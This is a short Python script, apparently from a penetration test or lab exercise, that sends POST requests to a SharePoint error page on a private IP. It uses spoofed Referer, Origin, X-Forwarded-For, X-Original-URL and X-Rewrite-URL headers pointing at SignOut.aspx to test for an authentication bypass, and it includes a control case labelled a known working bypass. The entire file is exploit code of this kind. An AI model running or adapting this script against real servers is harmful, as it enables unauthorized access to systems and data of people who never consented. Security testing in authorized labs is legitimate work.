# Test alternative HTTP headers that might trigger auth bypass
# Purpose: Verify if headers other than Referer can bypass authentication

import requests

base_url = "http://10.10.10.166"
test_endpoint = "/_layouts/15/Error.aspx"  # Known vulnerable from initial analysis
test_body = "test=data"

# Test various header combinations
test_cases = [
    {
        "name": "X-Forwarded-For with signout path",
        "headers": {
            "X-Forwarded-For": "/_layouts/SignOut.aspx",
            "User-Agent": "Mozilla/5.0"
        }
    },
    {
        "name": "X-Original-URL with signout path",
        "headers": {
            "X-Original-URL": "/_layouts/SignOut.aspx",
            "User-Agent": "Mozilla/5.0"
        }
    },
    {
        "name": "X-Rewrite-URL with signout path",
        "headers": {
            "X-Rewrite-URL": "/_layouts/SignOut.aspx",
            "User-Agent": "Mozilla/5.0"
        }
    },
    {
        "name": "Origin header with signout",
        "headers": {
            "Origin": "http://10.10.10.166/_layouts/SignOut.aspx",
            "User-Agent": "Mozilla/5.0"
        }
    },
    {
        "name": "Both Referer and Origin",
        "headers": {
            "Referer": "/_layouts/SignOut.aspx",
            "Origin": "http://10.10.10.166",
            "User-Agent": "Mozilla/5.0"
        }
    },
    {
        "name": "Multiple Referer headers (HTTP smuggling)",
        "headers": {
            "Referer": ["/_layouts/SignOut.aspx", "/_layouts/Settings.aspx"],
            "User-Agent": "Mozilla/5.0"
        }
    }
]

for test in test_cases:
    print(f"\n[*] Test: {test['name']}")
    headers = test['headers'].copy()
    headers["Content-Type"] = "application/x-www-form-urlencoded"
    
    try:
        response = requests.post(f"{base_url}{test_endpoint}", headers=headers, data=test_body, timeout=10)
        print(f"    Status: {response.status_code}")
        if response.status_code == 200:
            print(f"    *** BYPASS SUCCESSFUL ***")
        elif response.status_code == 401:
            print(f"    Result: BLOCKED (auth required)")
    except Exception as e:
        print(f"    Error: {e}")

# Control test - known working bypass
print(f"\n[*] CONTROL: Original Referer bypass (should work)")
headers = {
    "Referer": "/_layouts/SignOut.aspx",
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded"
}
response = requests.post(f"{base_url}{test_endpoint}", headers=headers, data=test_body, timeout=10)
print(f"    Status: {response.status_code}")
print(f"    Result: {'BYPASS WORKS' if response.status_code == 200 else 'UNEXPECTED'}")
